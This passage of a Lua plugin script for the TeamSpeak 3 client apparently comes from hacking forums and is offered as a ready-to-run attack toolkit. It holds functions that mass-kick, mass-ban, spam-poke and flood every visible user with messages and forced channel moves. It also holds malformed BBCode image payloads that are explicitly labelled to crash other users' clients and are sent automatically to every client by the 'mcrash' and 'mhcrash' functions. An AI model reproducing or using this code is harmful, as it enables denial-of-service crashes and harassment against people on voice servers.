	ts3.printMessageToCurrentTab("[b][i]== Successfully poked " .. counter .. "/" .. #clients - 1 .. " clients ==[/i][/b]")
end
--
-- Global Mass Message Script (subscribe all possible channels before moving) (/lua run gmmsg <message>)
--
function gmmsg(serverConnectionHandlerID, ...)
	-- ts3.printMessageToCurrentTab("= [b][u]Mass Control Module Version 1.2 by [url=http://forum.teamspeak.com/showthread.php?t=57386]Willy_Sunny[/url][/u][/b] =")
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
	local error = ts3.requestChannelSubscribeAll(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error subscribing channel: " .. error)
		return
	end
	-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end
	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	-- Process Argument message
	local argMsg = ""
	for i,v in ipairs(arg) do
		argMsg = argMsg .. tostring(v) .. " "
	end
	local counter = 0
	ts3.printMessageToCurrentTab("[b][i]== Mass messaging " .. #clients - 1 .. " visible clients ==[/i][/b]")
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestSendPrivateTextMsg(serverConnectionHandlerID, argMsg, clients[i])
			if error == ts3errors.ERROR_ok then
				counter = counter + 1
			else
				print("Error messaging client ID: " .. clients[i] .. "\n")
			end
		end
	end
	ts3.printMessageToCurrentTab("[b][i]== Successfully messaged " .. counter .. "/" .. #clients - 1 .. " clients ==[/i][/b]")
end
--
-- Global Mass Message & Poke Script (subscribe all possible channels before moving) (/lua run gmmp <message>)
--
function gmmp(serverConnectionHandlerID, ...)
	-- ts3.printMessageToCurrentTab("= [b][u]Mass Control Module Version 1.2 by [url=http://forum.teamspeak.com/showthread.php?t=57386]Willy_Sunny[/url][/u][/b] =")
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
	local error = ts3.requestChannelSubscribeAll(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error subscribing channel: " .. error)
		return
	end
	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	-- Process Argument message
	local argMsg = ""
	for i,v in ipairs(arg) do
		argMsg = argMsg .. tostring(v) .. " "
	end
	local msgcounter = 0
	local pokecounter = 0
	ts3.printMessageToCurrentTab("[b][i]== Mass poking & messaging " .. #clients - 1 .. " visible clients ==[/i][/b]")
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestClientPoke(serverConnectionHandlerID, clients[i], argMsg)
			if error == ts3errors.ERROR_ok then
				pokecounter = pokecounter + 1
			else
				print("Error poking client ID: " .. clients[i] .. "\n")
			end
			local error = ts3.requestSendPrivateTextMsg(serverConnectionHandlerID, argMsg, clients[i])
			if error == ts3errors.ERROR_ok then
				msgcounter = msgcounter + 1
			else
				print("Error messaging client ID: " .. clients[i] .. "\n")
			end
		end
	end
	ts3.printMessageToCurrentTab("[b][i]== Successfully poked " .. pokecounter .. "/" .. #clients - 1 .. " clients, and messaged " .. msgcounter .. "/" .. #clients - 1 .. " clients ==[/i][/b]")
end
-- -----------------------------=LOGGING=-------------------------------------
if EMC_DEBUG == true then
-- local logMSG = ("loading..." --, SCRIPT , VERSION)
 ts3.printMessageToCurrentTab("[color=darkgreen]".. SCRIPT1SHORT .."[/color] functions loaded.")
-- Log(LogMSG)
end
-- ____________________________-=LOGGING=-____________________________________
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--======================================================================================================================================================================
-- Mass ExoticHackers TS3 Tools Functions
--======================================================================================================================================================================
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
--
-- Run with "/lua run mk <message>"
--
function mk(serverConnectionHandlerID, ...)
	-- ts3.printMessageToCurrentTab("= [b][u]Mass ExoticHackers TS3 Tools	 Version 1.0b by [url=http://exotichackers.net/member.php?8-TheCAKiLLa]TheCAKiLLa[/url][/u][/b] =")
------------
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end
	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	-- Process Argument message
	local argMsg = ""
	for i,v in ipairs(arg) do
		argMsg = argMsg .. tostring(v) .. " "
	end
	local counter = 0
	ts3.printMessageToCurrentTab("[b][i]== Mass Kicking " .. #clients - 1 .. " visible clients ==[/i][/b]")
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestClientKickFromServer(serverConnectionHandlerID, clients[i], argMsg)
			if error == ts3errors.ERROR_ok then
				counter = counter + 1
			else
				print("Error poking client ID: " .. clients[i] .. "\n")
			end
		end
	end
	ts3.printMessageToCurrentTab("[b][i]== Successfully Kicked " .. counter .. "/" .. #clients - 1 .. " clients ==[/i][/b]")
end
--
-- Run with "/lua run mck <message>"
--
function mck(serverConnectionHandlerID, channelID, kickMSG)
	-- ts3.printMessageToCurrentTab("= [b][u]Mass ExoticHackers TS3 Tools	 Version 1.0b by [url=http://exotichackers.net/member.php?8-TheCAKiLLa]TheCAKiLLa[/url][/u][/b] =")
------------
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end
	if channelID == 0 then
		clients, error = ts3.getClientList(serverConnectionHandlerID)
		if error ~= ts3errors.ERROR_ok then
			print("Error getting clients: " .. error)
			return
		end
	else
		clients, error = ts3.getChannelClientList(serverConnectionHandlerID, channelID)
		if error ~= ts3errors.ERROR_ok then
			print("Error getting clients of channel: " .. channelID .. " errorID: " .. error)
			return
		end
	end
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	-- Process Argument message
	-- local argMsg = ""
	-- for i,v in kickMSG do
		-- argMsg = argMsg .. tostring(v) .. " "
	-- end
	local counter = 0
	if channelID == 0 then
		ts3.printMessageToCurrentTab("[b][i]== Mass Kicking " .. #clients - 1 .. " visible clients ==[/i][/b]")
	else
		ts3.printMessageToCurrentTab("[b][i]== Mass Kicking " .. #clients .. " visible clients from Channel #" .. channelID .. " ==[/i][/b]")
	end
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestClientKickFromChannel(serverConnectionHandlerID, clients[i], kickMSG)
			if error == ts3errors.ERROR_ok then
				counter = counter + 1
			else
				print("Error kicking client ID: " .. clients[i] .. "\n")
			end
		end
	end
	if channelID == 0 then
		ts3.printMessageToCurrentTab("[b][i]== Successfully Kicked From Channel " .. counter .. "/" .. #clients - 1 .. " clients ==[/i][/b]")
	else
		ts3.printMessageToCurrentTab("[b][i]== Successfully Kicked from Channel #" .. channelID .. " " .. counter .. "/" .. #clients - 1 .. " clients ==[/i][/b]")
	end
end
--
-- Run with "/lua run mb <duration> <message>"
--
 
 
function mb(serverConnectionHandlerID, timeInSeconds, banMSG)
 
        -- ts3.printMessageToCurrentTab("= [b][u]Mass ExoticHackers TS3 Tools       Version 1.0b by [url=http://exotichackers.net/member.php?8-TheCAKiLLa]TheCAKiLLa[/url][/u][/b] =")
        -- Get Self ID
        local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
        if error ~= ts3errors.ERROR_ok then
                print("Error getting own client ID: " .. error)
                return
        end
        if myClientID == 0 then
                ts3.printMessageToCurrentTab("Not connected")
                return
        end
 
        -- Get which channel we are in
        local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
        if error ~= ts3errors.ERROR_ok then
                print("Error getting own channel: " .. error)
                return
        end
 
        local clients, error = ts3.getClientList(serverConnectionHandlerID)
        if error == ts3errors.ERROR_not_connected then
                ts3.printMessageToCurrentTab("Not connected")
                return
        elseif error ~= ts3errors.ERROR_ok then
                print("Error getting client list: " .. error)
                return
        end
 
        -- Process Argument message
        -- local argMsg = ""
        -- for i,v in ipairs(arg) do
                -- argMsg = argMsg .. tostring(v) .. " "
        -- end
 
        local counter = 0
        ts3.printMessageToCurrentTab("[b][i]== Mass Banning " .. #clients - 1 .. " visible clients ==[/i][/b]")
        for i=1, #clients do
                if clients[i] ~= myClientID then
                        local error = ts3.banclient(serverConnectionHandlerID,clients[i], timeInSeconds, banMSG)                                           
                        if error == ts3errors.ERROR_ok then
                                counter = counter + 1
                        else
                                print("Error banning client ID: " .. clients[i] .. "\n")
                        end
                end
        end
        ts3.printMessageToCurrentTab("[b][i]== Successfully Banned" .. counter .. "/" .. #clients - 1 .. " clients ==[/i][/b]")
end
-- -----------------------------=LOGGING=-------------------------------------
if EMC_DEBUG == true then
-- local logMSG = ("loading..." --, SCRIPT , VERSION)
 ts3.printMessageToCurrentTab("[color=darkgreen]".. SCRIPT2SHORT .."[/color] functions loaded.")
-- Log(LogMSG)
end
-- ____________________________-=LOGGING=-____________________________________
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
--======================================================================================================================================================================
-- Extended Mass Control Module Functions
--======================================================================================================================================================================
------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-- This WILL freeze your client while running. You can hear other voice messages, but you cannot transmit for #ofpokes*secsInBetweenPokes seconds.
 
function emcpokespam(serverConnectionHandlerID, pokeNum, sleepNum, clientID, txt)
	local clock = os.clock
	local function sleep(n)
	local t0 = clock()
	while clock() - t0 <= n do end
	end

	i = 1
	while i  <= pokeNum do
		sleep(sleepNum)
		local error = ts3.requestClientPoke(serverConnectionHandlerID, clientID, txt)
		if error == ts3errors.ERROR_not_connected then
				ts3.printMessage(serverConnectionHandlerID, "Error: Not Connected")
				return
		elseif error ~= ts3errors.ERROR_ok then
				print("Getting Error: " .. error .. "by poking the ID: " .. clientID)
				return
		end
		 i = i + 1
	end
	end

function pokeall(serverConnectionHandlerID)
	local clients, error = ts3.getClientList(serverConnectionHandlerID)	
	for i=1, #clients do
		local clname, clientNameError = ts3.getClientVariableAsString(serverConnectionHandlerID, clients[i], ts3defs.ClientProperties.CLIENT_NICKNAME)
		ts3.requestClientPoke(serverConnectionHandlerID, clients[i], "*poked*")
		
	end	
end
 
 -- function pokespam(serverConnectionHandlerID, clientID, txt, count, delay)
	-- local clock = os.clock
	-- local function sleep(n)
	  -- local t0 = clock()
	  -- while clock() - t0 <= n do end
	-- end
        -- local error = ts3.requestClientPoke(serverConnectionHandlerID, clientID, txt)
        -- if error == ts3errors.ERROR_not_connected then
                -- ts3.printMessage(serverConnectionHandlerID, "Error: Not Connected")
                -- return
        -- elseif error ~= ts3errors.ERROR_ok then
                -- print ("Getting Error: " .. error .. "by poking the ID: " .. clientID)
                -- return
        -- end
       
                -- for i = 0, i < count, i++
                -- ts3.requestClientPoke(serverConnectionHandlerID, clientID, txt)
                        -- sleep(delay)
                -- end
-- end
--
-- Run with "/lua run ctxt"
--
function ctxt(serverConnectionHandlerID)
	 ts3.printMessageToCurrentTab("[b][color=white]Normal Text to crash Clients (Just Copy and paste the Text below):[/color][/b]")
	 ts3.printMessageToCurrentTab("[color=red][norparse][img][img]//http://www.teamspeak.com/templates/teamspeak_v3/images/blank.gif[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7a.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7b.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.24[/img][/img][/color]")
end
--
-- Run with ""
--
-- Channel Crash Script (/lua run ccrash)
--
function ccrash(serverConnectionHandlerID, ...)
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
	local error = ts3.requestChannelSubscribeAll(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error subscribing channel: " .. error)
		return
	end
	-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end
	--ts3.printMessageToCurrentTab("= [b][u][color=yellow]Remember:[/color] This works only if the Victims are running on TeamSpeak 3 Version [color=red]3.0.14[/color][/u][/b] =")
	ts3.printMessageToCurrentTab("[b][i]== Mass crashing all clients in Channel: " .. myChannelID .. "")
	
	ts3.requestSendChannelTextMsg(serverConnectionHandlerID, multiCrashMSG, myChannelID)
	
end
--
-- Run with "/lua run hctxt"
--
-- function hctxt(serverConnectionHandlerID)
	 -- ts3.printMessageToCurrentTab("[b][color=white]Hidden Text to crash Clients (Just Copy and paste the Text below):[/color][/b]")
	 -- ts3.printMessageToCurrentTab("[color=red][img][img]" width="999999" height="999999[/img][/img][img][img]//http://www.teamspeak.com/templates/teamspeak_v3/images/blank.gif[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7a.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7b.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.24[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7z.png?ver=4.6.0.28[/img][/img][/color]")
-- end
--
-- Run with "/lua run chcrash"
--
-- Channel Mass Hidden Crash Script (subscribe all possible channels before crashing)
--
-- function chcrash(serverConnectionHandlerID, ...)
	-- Get Self ID
	-- local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	-- if error ~= ts3errors.ERROR_ok then
		-- print("Error getting own client ID: " .. error)
		-- return
	-- end
	-- if myClientID == 0 then
		-- ts3.printMessageToCurrentTab("Not connected")
		-- return
	-- end
	-- local error = ts3.requestChannelSubscribeAll(serverConnectionHandlerID)
	-- if error == ts3errors.ERROR_not_connected then
		-- ts3.printMessageToCurrentTab("Not connected")
		-- return
	-- elseif error ~= ts3errors.ERROR_ok then
		-- print("Error subscribing channel: " .. error)
		-- return
	-- end
	-- Get which channel we are in
	-- local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	-- if error ~= ts3errors.ERROR_ok then
		-- print("Error getting own channel: " .. error)
		-- return
	-- end
	-- ts3.printMessageToCurrentTab("= [b][u][color=yellow]Remember:[/color] This works only if the Victims are running on TeamSpeak 3 Version [color=red]3.0.14[/color][/u][/b] =")
	-- ts3.printMessageToCurrentTab("[b][i]== Mass hidden crashing all clients in Channel: " .. myChannelID .. "[/b][/i]")
	
-- local crashMsg = "[img][img] width=''999999'' height=''999999''[/img][/img][img][img]//http://www.teamspeak.com/templates/teamspeak_v3/images/blank.gif[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7a.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7b.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.24[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7z.png?ver=4.6.0.28[/img][/img]"
	-- ts3.requestSendChannelTextMsg(serverConnectionHandlerID, crashMsg, myChannelID)
	
-- end
--
-- Run with "/lua run cleartxt"
--
-- function cleartxt(serverConnectionHandlerID)
	 -- ts3.printMessageToCurrentTab("[b][color=white]Hidden Text to crash Clients (Just Copy and paste the Text below):[/color][/b]")
	 -- ts3.printMessageToCurrentTab("[color=red][img][img] width=''999999'' height=''999999''[/img][/img][/color]")
-- end
--
-- Run with "/lua run cclear"
--
-- Channel Mass Hidden Crash Script (subscribe all possible channels before crashing)
--
-- function cclear(serverConnectionHandlerID, ...)
	-- Get Self ID
	-- local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	-- if error ~= ts3errors.ERROR_ok then
		-- print("Error getting own client ID: " .. error)
		-- return
	-- end
	-- if myClientID == 0 then
		-- ts3.printMessageToCurrentTab("Not connected")
		-- return
	-- end
	-- local error = ts3.requestChannelSubscribeAll(serverConnectionHandlerID)
	-- if error == ts3errors.ERROR_not_connected then
		-- ts3.printMessageToCurrentTab("Not connected")
		-- return
	-- elseif error ~= ts3errors.ERROR_ok then
		-- print("Error subscribing channel: " .. error)
		-- return
	-- end
	-- Get which channel we are in
	-- local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	-- if error ~= ts3errors.ERROR_ok then
		-- print("Error getting own channel: " .. error)
		-- return
	-- end
	-- ts3.printMessageToCurrentTab("= [b][u][color=yellow]Remember:[/color] This works only if the Victims are running on TeamSpeak 3 Version [color=red]3.0.14[/color][/u][/b] =")
	-- ts3.printMessageToCurrentTab("[b][i]== Mass hidden crashing all clients in Channel: " .. myChannelID .. "[/b][/i]")
	
-- local crashMsg = "[img][img] width=''999999'' height=''999999''[/img][/img]"
	-- ts3.requestSendChannelTextMsg(serverConnectionHandlerID, crashMsg, myChannelID)
	
-- end
--
-- Run with "/lua run mctxt"
--
function mctxt(serverConnectionHandlerID)
	 ts3.printMessageToCurrentTab("[b][color=white]Text to crash [/color][color=orange]all[/color][color=white] Clients running any Version (Just Copy and paste the Text below):[/color][/b]")
	 ts3.printMessageToCurrentTab("[color=red][img][img]//1/z[/img][/img][img][img]//2/z[/img][/img][img][img]//3/z[/img][/img][img][img]//4/z[/img][/img][img][img]//5/z[/img][/img][img][img]//6/z[/img][/img][img][img]//7/z[/img][/img][img][img]//8/z[/img][/img][img][img]//9/z[/img][/img][img][img]//10/z[/img][/img][img][img]//11/z[/img][/img][img][img]//12/z[/img][/img][img][img]//13/z[/img][/img][img][img]//14/z[/img][/img][img][img]//15/z[/img][/img][img][img]//16/z[/img][/img][img][img]//17/z[/img][/img][img][img]//18/z[/img][/img][img][img]//19/z[/img][/img][img][img]//20/z[/img][/img][img][img]//21/z[/img][/img][img][img]//22/z[/img][/img][img][img]//23/z[/img][/img][img][img]//24/z[/img][/img][img][img]//25/z[/img][/img][img][img]//26/z[/img][/img][img][img]//27/z[/img][/img][img][img]//28/z[/img][/img][img][img]//29/z[/img][/img][img][img]//30/z[/img][/img][img][img]//31/z[/img][/img][/color]")
end
--
-- Run with "/lua run pctxt"
--
function pctxt(serverConnectionHandlerID)
	 ts3.printMessageToCurrentTab("[b][color=white]Poke Text to crash Clients (Just Copy and paste the Text below):[/color][/b]")
	 ts3.printMessageToCurrentTab("[color=red][img]//http://i.answers.microsoft.com/static/images/defaultuser7z.png?ver=4.6.0.28[/img]")
end
--
-- Run with "/lua run mcrash"
--
-- Global Multi Crash Script (Works with every version) (subscribe all possible channels before crashing)
--
function mcrash(serverConnectionHandlerID, ...)
	--ts3.printMessageToCurrentTab("= [b][u][color=yellow]Remember:[/color] This works only if the Victims are running on TeamSpeak 3 Version [color=red]3.0.14[/color][/u][/b] =")
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
	local error = ts3.requestChannelSubscribeAll(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error subscribing channel: " .. error)
		return
	end
	-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end
	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	-- Process Argument message
	local multiCrashMSG = "[img][img]//1/z[/img][/img][img][img]//2/z[/img][/img][img][img]//3/z[/img][/img][img][img]//4/z[/img][/img][img][img]//5/z[/img][/img][img][img]//6/z[/img][/img][img][img]//7/z[/img][/img][img][img]//8/z[/img][/img][img][img]//9/z[/img][/img][img][img]//10/z[/img][/img][img][img]//11/z[/img][/img][img][img]//12/z[/img][/img][img][img]//13/z[/img][/img][img][img]//14/z[/img][/img][img][img]//15/z[/img][/img][img][img]//16/z[/img][/img][img][img]//17/z[/img][/img][img][img]//18/z[/img][/img][img][img]//19/z[/img][/img][img][img]//20/z[/img][/img][img][img]//21/z[/img][/img][img][img]//22/z[/img][/img][img][img]//23/z[/img][/img][img][img]//24/z[/img][/img][img][img]//25/z[/img][/img][img][img]//26/z[/img][/img][img][img]//27/z[/img][/img][img][img]//28/z[/img][/img][img][img]//29/z[/img][/img][img][img]//30/z[/img][/img][img][img]//31/z[/img][/img]"
--	for i,v in ipairs(arg) do
--		argMsg = argMsg .. tostring(v) .. " "
--	end
	local counter = 0
	ts3.printMessageToCurrentTab("[b][i]== Mass crashing [color=yellow]" .. #clients - 1 .. "[/color] visible clients ==[/i][/b]")
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestSendPrivateTextMsg(serverConnectionHandlerID, multiCrashMSG, clients[i])
			if error == ts3errors.ERROR_ok then
				counter = counter + 1
			else
				print("Error messaging client ID: " .. clients[i] .. "\n")
			end
		end
	end
	ts3.printMessageToCurrentTab("[b][i]== Successfully crashed [color=green]" .. counter .. "[/color] / [color=yellow]" .. #clients - 1 .. "[/color] clients ==[/i][/b]")
end
--
-- Run with "/lua run mhcrash"
--
-- Global Mass Hidden Crash Script (subscribe all possible channels before crashing)
--
function mhcrash(serverConnectionHandlerID, ...)
	--ts3.printMessageToCurrentTab("= [b][u][color=yellow]Remember:[/color] This works only if the Victims are running on TeamSpeak 3 Version [color=red]3.0.14[/color][/u][/b] =")
	-- Get Self ID
	local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own client ID: " .. error)
		return
	end
	if myClientID == 0 then
		ts3.printMessageToCurrentTab("Not connected")
		return
	end
	local error = ts3.requestChannelSubscribeAll(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error subscribing channel: " .. error)
		return
	end
	-- Get which channel we are in
	local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	if error ~= ts3errors.ERROR_ok then
		print("Error getting own channel: " .. error)
		return
	end
	local clients, error = ts3.getClientList(serverConnectionHandlerID)
	if error == ts3errors.ERROR_not_connected then
		ts3.printMessageToCurrentTab("Not connected")
		return
	elseif error ~= ts3errors.ERROR_ok then
		print("Error getting client list: " .. error)
		return
	end
	-- Process Argument message
	local crashMsg = "[img][img]" width="999999" height="999999[/img][/img][img][img]//http://www.teamspeak.com/templates/teamspeak_v3/images/blank.gif[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7a.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7b.png?ver=4.6.0.28[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser75.png?ver=4.6.0.24[/img][/img] [img][img]//http://i.answers.microsoft.com/static/images/defaultuser7z.png?ver=4.6.0.28[/img][/img]"
--	for i,v in ipairs(arg) do
--		argMsg = argMsg .. tostring(v) .. " "
--	end
	local counter = 0
	ts3.printMessageToCurrentTab("[b][i]== Mass hidden crashing [color=yellow]" .. #clients - 1 .. "[/color] visible clients ==[/i][/b]")
	for i=1, #clients do
		if clients[i] ~= myClientID then
			local error = ts3.requestSendPrivateTextMsg(serverConnectionHandlerID, crashMsg, clients[i])
			if error == ts3errors.ERROR_ok then
				counter = counter + 1
			else
				print("Error messaging client ID: " .. clients[i] .. "\n")
			end
		end
	end
	ts3.printMessageToCurrentTab("[b][i]== Successfully hidden crashed [color=green]" .. counter .. "[/color] / [color=yellow]" .. #clients - 1 .. "[/color] clients ==[/i][/b]")
end
--
-- Run with "/lua run mclear"
--
-- Global Mass Clear Chat Script (subscribe all possible channels before clearing)
--
-- function mclear(serverConnectionHandlerID, ...)
	--ts3.printMessageToCurrentTab("= [b][u][color=yellow]Remember:[/color] This works only if the Victims are running on TeamSpeak 3 Version [color=red]3.0.14[/color][/u][/b] =")
	-- Get Self ID
	-- local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
	-- if error ~= ts3errors.ERROR_ok then
		-- print("Error getting own client ID: " .. error)
		-- return
	-- end
	-- if myClientID == 0 then
		-- ts3.printMessageToCurrentTab("Not connected")
		-- return
	-- end
	-- local error = ts3.requestChannelSubscribeAll(serverConnectionHandlerID)
	-- if error == ts3errors.ERROR_not_connected then
		-- ts3.printMessageToCurrentTab("Not connected")
		-- return
	-- elseif error ~= ts3errors.ERROR_ok then
		-- print("Error subscribing channel: " .. error)
		-- return
	-- end
	-- Get which channel we are in
	-- local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
	-- if error ~= ts3errors.ERROR_ok then
		-- print("Error getting own channel: " .. error)
		-- return
	-- end
	-- local clients, error = ts3.getClientList(serverConnectionHandlerID)
	-- if error == ts3errors.ERROR_not_connected then
		-- ts3.printMessageToCurrentTab("Not connected")
		-- return
	-- elseif error ~= ts3errors.ERROR_ok then
		-- print("Error getting client list: " .. error)
		-- return
	-- end
	-- Process Argument message
-- local crashMsg = "[img][img] width=999999"" height=""999999""[/img][/img]"
	-- for i,v in ipairs(arg) do
		-- argMsg = argMsg .. tostring(v) .. " "
	-- end
	-- local counter = 0
	-- ts3.printMessageToCurrentTab("[b][i]== Mass chat clearing [color=yellow]" .. #clients - 1 .. "[/color] visible clients ==[/i][/b]")
	-- for i=1, #clients do
		-- if clients[i] ~= myClientID then
			-- local error = ts3.requestSendPrivateTextMsg(serverConnectionHandlerID, crashMsg, clients[i])
			-- if error == ts3errors.ERROR_ok then
				-- counter = counter + 1
			-- else
				-- print("Error messaging client ID: " .. clients[i] .. "\n")
			-- end
		-- end
	-- end
	-- ts3.printMessageToCurrentTab("[b][i]== Successfully cleared [color=green]" .. counter .. "[/color] / [color=yellow]" .. #clients - 1 .. "[/color] clients chats ==[/i][/b]")
-- end
function movespam(serverConnectionHandlerID, ...)
        local myClientID, error = ts3.getClientID(serverConnectionHandlerID)
        if error ~= ts3errors.ERROR_ok then
                return
        end
        if myClientID == 0 then
                return
        end
 
        local myChannelID, error = ts3.getChannelOfClient(serverConnectionHandlerID, myClientID)
        if error ~= ts3errors.ERROR_ok then
                return
        end
 
        local error = ts3.requestChannelSubscribeAll(serverConnectionHandlerID)
        if error == ts3errors.ERROR_not_connected then
                return
        elseif error ~= ts3errors.ERROR_ok then
                return
        end
 
        local clients, error = ts3.getClientList(serverConnectionHandlerID)
        if error == ts3errors.ERROR_not_connected then
                return
        elseif error ~= ts3errors.ERROR_ok then
                return
        end
 
        for i=1, #clients do
                if clients[i] ~= myClientID then
                        for b=1, 10 do
                        ts3.requestClientPoke(serverConnectionHandlerID, clients[i], "")
                        end
                        for b=1, 1000 do
                        ts3.requestSendPrivateTextMsg(serverConnectionHandlerID, "meep", clients[i])
                        end
                        for b=1, 100 do
                        ts3.requestClientMove(serverConnectionHandlerID, clients[i], 1, password)
                        ts3.requestClientMove(serverConnectionHandlerID, clients[i], 41, password)
                        ts3.requestClientMove(serverConnectionHandlerID, clients[i], 42, password)
                        ts3.requestClientMove(serverConnectionHandlerID, clients[i], 44, password)
                        ts3.requestClientMove(serverConnectionHandlerID, clients[i], 63, password)
